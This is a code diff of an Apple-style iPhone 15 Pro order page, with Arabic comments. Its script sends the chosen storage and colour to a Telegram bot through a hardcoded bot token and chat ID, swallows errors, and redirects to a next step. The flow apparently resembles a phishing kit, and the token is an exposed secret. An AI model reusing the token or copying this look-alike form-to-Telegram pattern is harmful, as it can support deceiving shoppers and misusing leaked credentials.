@@ -9,7 +9,7 @@
     :root {
       --bg-page: #f5f5f7;
       --card-bg: #ffffff;
-      --text-main: #111111;
+      --text-main: #111;
       --text-muted: #6e6e73;
       --accent-blue: #0071e3;
       --border: #d2d2d7;
@@ -40,7 +40,7 @@
       padding: 18px;
       border-radius: 16px;
       margin-bottom: 20px;
-      border: 1px solid rgba(0, 0, 0, 0.06);
+      border: 1px solid rgba(0,0,0,0.06);
     }
 
     .section-title {
@@ -49,7 +49,7 @@
       margin-bottom: 10px;
     }
 
-    /* Disabled storage options */
+    /* تعطيل الخيارات غير المتاحة في السعة */
     .option.disabled {
       opacity: 0.45;
       cursor: not-allowed;
@@ -76,7 +76,7 @@
 
     .option.selected {
       border-color: var(--accent-blue);
-      background: rgba(0, 113, 227, 0.08);
+      background: rgba(0,113,227,0.08);
     }
 
     .color-circle {
@@ -110,7 +110,7 @@
       background: transparent;
       color: var(--text-muted);
       border-radius: 999px;
-      border: 1px solid rgba(0, 0, 0, 0.15);
+      border: 1px solid rgba(0,0,0,0.15);
       text-align: center;
       font-size: 15px;
       cursor: pointer;
@@ -147,7 +147,7 @@
       </div>
       <div class="option">
         <div class="color-circle" style="background:#283b64;"></div>
-        Blue Titanium
+        Blue<br>Titanium
       </div>
       <div class="option">
         <div class="color-circle" style="background:#fcfcfc;"></div>
@@ -171,43 +171,47 @@
   </div>
 
   <script>
-    // Storage selection (مع منع الضغط على disabled)
-    document.querySelectorAll("#storage-options .option").
-      forEach(function (el) {
-      el.addEventListener("click", function () {
-        if (this.classList.contains("disabled")) return;
+    // اختيار السعة (فعلياً ما في غير 256، لكن نخلي الكود نظيف)
+    document.
+      querySelectorAll("#storage-options .option").forEach(function (el) {
+      if (el.classList.contains("disabled")) return; // تجاهل المعطلين
 
+      el.addEventListener("click", function () {
         document
           .querySelectorAll("#storage-options .option")
-          .forEach((x) => x.classList.remove("selected"));
+          .forEach(x => x.classList.remove("selected"));
 
         this.classList.add("selected");
       });
     });
 
-    // Color selection
+    // اختيار اللون
     document.querySelectorAll("#color-options .option").forEach(function (el) {
       el.addEventListener("click", function () {
         document
           .querySelectorAll("#color-options .option")
-          .forEach((x) => x.classList.remove("selected"));
+          .forEach(x => x.classList.remove("selected"));
 
         this.classList.add("selected");
       });
     });
 
-    // Continue → send to Telegram + go to step-3
+    // Continue → Telegram + step-3
     document.getElementById("continue-btn").addEventListener("click", function () {
       const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
-      const chatId = "7811430582";
+      const chatId   = "7811430582";
 
-      const selectedStorage =
-        document.querySelector("#storage-options .selected")?.innerText.trim() ||
-        "256 GB";
+      // السعة المختارة
+      const storageEl = document.querySelector("#storage-options .selected");
+      const selectedStorage = storageEl ? storageEl.innerText.trim() : "256 GB";
 
-      const selectedColor =
-        document.querySelector("#color-options .selected")?.innerText.trim() ||
-        "Natural Titanium";
+      // اللون المختار
+      const colorEl = document.querySelector("#color-options .selected");
+      let selectedColor = "Natural Titanium";
+      if (colorEl) {
+        // innerText فيه circle، فنأخذ آخر سطر
+        selectedColor = colorEl.innerText.split("\n").pop().trim();
+      }
 
       const msg = 📱 *New Order Submitted*\n\nModel: iPhone 15 Pro\nStorage: ${selectedStorage}\nColor: ${selectedColor};
 
@@ -217,11 +221,13 @@
         body: JSON.stringify({
           chat_id: chatId,
           text: msg,
-          parse_mode: "Markdown",
-        }),
-      }).catch((e) => {
-        console.error("Telegram error:", e);
-      }).finally(() => {
+          parse_mode: "Markdown"
+        })
+      })
+      .catch(() => {
+        // حتى لو فشل الإرسال، نكمل للصفحة اللي بعدها
+      })
+      .finally(() => {
         window.location.href = "step-3.html";
       });
     });
